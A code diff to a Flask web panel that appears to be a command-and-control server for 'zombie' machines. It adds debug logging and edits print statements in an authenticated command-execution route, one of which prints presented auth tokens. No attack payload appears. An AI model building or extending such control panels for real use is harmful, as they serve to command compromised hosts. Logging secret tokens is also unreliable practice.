@@ -4,6 +4,17 @@ import base64
 from server import ioFiles
 # from os import path, environ, mkdir
 import os 
+import logging
+from datetime import datetime
+
+logger = logging.getLogger("c2_server")
+logging.basicConfig(level=logging.DEBUG, handlers=[
+                        logging.FileHandler(f"c2_dev-{datetime.now().strftime('%Y%m%d_%H%S')}.log"),
+                        logging.StreamHandler()
+                    ], format="%(asctime)s || %(name)s->%(funcName)s:%(levelname)s => %(message)s    "
+                    )
+#print(f"[???] in server/flask.py, name is: {__name__}")
+
 
 class Builder:
     app = Flask(__name__)
@@ -11,6 +22,7 @@ class Builder:
     #Should below also take a database object to manipulate on creation?
     def __init__(self):
         self.config_routes()
+        logger.debug("routes configured")
         self.app.config['UPLOAD_FOLDER'] = 'files/post/'
         if os.environ['base_path'] is not None:
             self.app.config['ROOT_PATH'] = os.environ['base_path']
@@ -142,11 +154,11 @@ class Builder:
                     auth = db.is_authd(token)
                     tok_for_zombie = db.get_all_dataTok(zombieID)
                     zID = zombieID
-                    print(f"INTERACT => auth is {auth}")
+                    print(f"[???] inTERACT => auth is {auth}")
                     if auth:
                         return render_template('execmd.html',d=tok_for_zombie,z=zID)
                     else:
-                        print(f"INTERACT => presented token: {token} wasn't found in DB!")
+                        print(f"[???] inTERACT => presented token: {token} wasn't found in DB!")
                         return redirect("/login", 302)
                 else:
                     return redirect("/login", 302)
